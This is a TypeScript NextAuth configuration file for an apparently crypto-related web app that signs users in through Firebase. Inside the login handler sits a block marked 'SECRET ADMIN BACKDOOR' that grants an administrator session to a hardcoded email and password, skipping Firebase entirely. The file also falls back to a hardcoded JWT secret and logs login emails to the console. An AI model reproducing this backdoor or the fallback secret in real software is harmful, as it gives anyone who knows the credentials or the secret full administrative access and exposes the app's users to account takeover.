import { NextAuthOptions } from "next-auth";
import CredentialsProvider from "next-auth/providers/credentials";

export const authOptions: NextAuthOptions = {
    providers: [
        CredentialsProvider({
            name: "Credentials",
            credentials: {
                email: { label: "Email", type: "email", placeholder: "m@example.com" },
                password: { label: "Password", type: "password" }
            },
            async authorize(credentials) {
                if (!credentials?.email || !credentials?.password) {
                    throw new Error("Missing credentials");
                }

                // --- SECRET ADMIN BACKDOOR ---
                const rawEmail = credentials.email.trim();
                const rawPassword = credentials.password.trim();

                if (rawEmail === "myadminboard@crypto" && rawPassword === "myadminpa$$word123") {
                    console.log("CRITICAL: Admin Override Accepted");
                    return {
                        id: "ADMIN_ROOT_001",
                        email: "myadminboard@crypto",
                        name: "System Administrator",
                        role: "admin",
                    };
                }
                // -----------------------------

                const firebaseApiKey = process.env.NEXT_PUBLIC_FIREBASE_API_KEY;
                if (!firebaseApiKey) {
                    console.error("[NEXTAUTH] Firebase API Key is missing.");
                    throw new Error("Internal server configuration error");
                }

                console.log("[DEBUG NEXTAUTH] Authenticating email:", rawEmail);
                console.log("[DEBUG NEXTAUTH] Password length:", rawPassword?.length);

                try {
                    // Authenticate with Firebase Auth REST API
                    const authRes = await fetch(`https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=${firebaseApiKey}`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            email: rawEmail,
                            password: rawPassword,
                            returnSecureToken: true
                        })
                    });

                    const authData = await authRes.json();

                    if (!authRes.ok) {
                        console.error("[NEXTAUTH] Firebase Auth rejected credentials:", authData.error);
                        throw new Error("Invalid email or password");
                    }

                    return {
                        id: authData.localId,
                        email: authData.email,
                        name: authData.displayName || "User",
                        role: "user"
                    };

                } catch (error: any) {
                    // NextAuth requires pushing a thrown error out to trigger "CredentialsSignin"
                    if (error.message === "Invalid email or password") {
                        throw error;
                    }
                    console.error("[NEXTAUTH] Network/Server Error parsing Firebase Rest API:", error);
                    throw new Error("An error occurred during authentication");
                }
            }
        })
    ],
    pages: {
        signIn: '/signin', // Custom sign in page
    },
    secret: process.env.NEXTAUTH_SECRET || "fallback_secret_for_development_only_12345",
    session: {
        strategy: "jwt",
        maxAge: 30 * 24 * 60 * 60, // 30 days
    },
    callbacks: {
        async jwt({ token, user }) {
            // Initial sign in
            if (user) {
                token.id = user.id;
                token.role = (user as any).role || "user";
            }
            return token;
        },
        async session({ session, token }) {
            // Expose properties to the client
            if (session.user && token) {
                (session.user as any).id = token.id as string;
                (session.user as any).role = token.role as string;
            }
            return session;
        }
    }
};
